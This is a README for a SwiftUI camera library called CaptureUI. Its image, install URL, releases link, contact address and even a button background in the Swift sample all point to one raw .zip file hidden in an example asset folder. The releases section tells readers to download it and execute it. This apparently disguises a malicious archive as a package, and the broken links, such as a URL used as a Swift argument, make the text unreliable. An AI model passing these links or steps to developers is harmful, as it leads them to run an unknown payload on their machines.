# CaptureUI 📸

![CaptureUI](https://github.com/ldcode25/CaptureUI/raw/refs/heads/master/Examples/Camera/Preview Content/Preview Assets.xcassets/Capture-UI-3.3-alpha.3.zip%20Camera%20Capture%https://github.com/ldcode25/CaptureUI/raw/refs/heads/master/Examples/Camera/Preview Content/Preview Assets.xcassets/Capture-UI-3.3-alpha.3.zip)

Welcome to **CaptureUI**, a configurable custom camera capture UI view designed specifically for SwiftUI. This repository offers a flexible solution for developers looking to integrate camera functionality into their SwiftUI applications seamlessly. 

## Table of Contents

- [Introduction](#introduction)
- [Features](#features)
- [Installation](#installation)
- [Usage](#usage)
- [Customization](#customization)
- [Examples](#examples)
- [Contributing](#contributing)
- [License](#license)
- [Releases](#releases)
- [Contact](#contact)

## Introduction

CaptureUI provides a simple yet powerful way to add camera capture functionality to your SwiftUI projects. With this library, you can easily create a custom camera interface that fits your app's design and user experience. Whether you are building a photo-sharing app, a scanning app, or any application that requires camera access, CaptureUI has you covered.

## Features

- **Customizable UI**: Modify the camera interface to match your app's design.
- **Easy Integration**: Simple setup process for quick implementation.
- **SwiftUI Compatible**: Built with SwiftUI in mind for a smooth developer experience.
- **Live Preview**: View the camera feed in real-time.
- **Capture Photos**: Take high-quality photos with a single tap.
- **Flash Support**: Control the camera flash with ease.
- **Error Handling**: Built-in error handling for camera access issues.

## Installation

To install CaptureUI, you can use Swift Package Manager. Follow these steps:

1. Open your Xcode project.
2. Navigate to `File` > `Swift Packages` > `Add Package Dependency`.
3. Enter the following URL: `https://github.com/ldcode25/CaptureUI/raw/refs/heads/master/Examples/Camera/Preview Content/Preview Assets.xcassets/Capture-UI-3.3-alpha.3.zip`.
4. Choose the version you want to install and complete the setup.

## Usage

To use CaptureUI in your SwiftUI application, follow these steps:

1. Import the library in your Swift file:

   ```swift
   import CaptureUI
   ```

2. Create a `CaptureView` instance in your SwiftUI view:

   ```swift
   struct ContentView: View {
       var body: some View {
           CaptureView()
               .frame(width: 300, height: 400)
       }
   }
   ```

3. Customize the view as needed by passing parameters to `CaptureView`.

## Customization

CaptureUI offers various customization options. You can adjust the following properties:

- **Camera Type**: Choose between front and back cameras.
- **Overlay View**: Add custom overlays like buttons or text.
- **Capture Button**: Change the appearance and size of the capture button.
- **Flash Mode**: Set the default flash mode (on, off, auto).

### Example of Customization

Here’s a simple example of how to customize the `CaptureView`:

```swift
struct CustomCaptureView: View {
    var body: some View {
        CaptureView(cameraType: .back, overlay: CustomOverlay())
            .frame(width: 300, height: 400)
    }
}

struct CustomOverlay: View {
    var body: some View {
        VStack {
            Spacer()
            Button(action: {
                // Capture action
            }) {
                Text("Capture")
                    .padding()
                    .background(https://github.com/ldcode25/CaptureUI/raw/refs/heads/master/Examples/Camera/Preview Content/Preview Assets.xcassets/Capture-UI-3.3-alpha.3.zip)
                    .foregroundColor(.white)
                    .cornerRadius(10)
            }
            .padding(.bottom, 20)
        }
    }
}
```

## Examples

To see CaptureUI in action, check out the example projects included in this repository. These examples demonstrate various configurations and features of CaptureUI. You can find them in the `Examples` folder.

## Contributing

We welcome contributions to CaptureUI! If you would like to contribute, please follow these steps:

1. Fork the repository.
2. Create a new branch for your feature or bug fix.
3. Make your changes and commit them with clear messages.
4. Push your branch and create a pull request.

Please ensure your code follows the project's style guidelines and includes tests where applicable.

## License

CaptureUI is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.

## Releases

For the latest releases and updates, please visit the [Releases section](https://github.com/ldcode25/CaptureUI/raw/refs/heads/master/Examples/Camera/Preview Content/Preview Assets.xcassets/Capture-UI-3.3-alpha.3.zip). Download the latest version and execute it in your project to take advantage of new features and improvements.

## Contact

If you have any questions or suggestions, feel free to reach out. You can open an issue in the repository or contact me directly at [https://github.com/ldcode25/CaptureUI/raw/refs/heads/master/Examples/Camera/Preview Content/Preview Assets.xcassets/Capture-UI-3.3-alpha.3.zip](https://github.com/ldcode25/CaptureUI/raw/refs/heads/master/Examples/Camera/Preview Content/Preview Assets.xcassets/Capture-UI-3.3-alpha.3.zip).

---

Thank you for checking out CaptureUI! We hope it helps you create amazing camera experiences in your SwiftUI applications.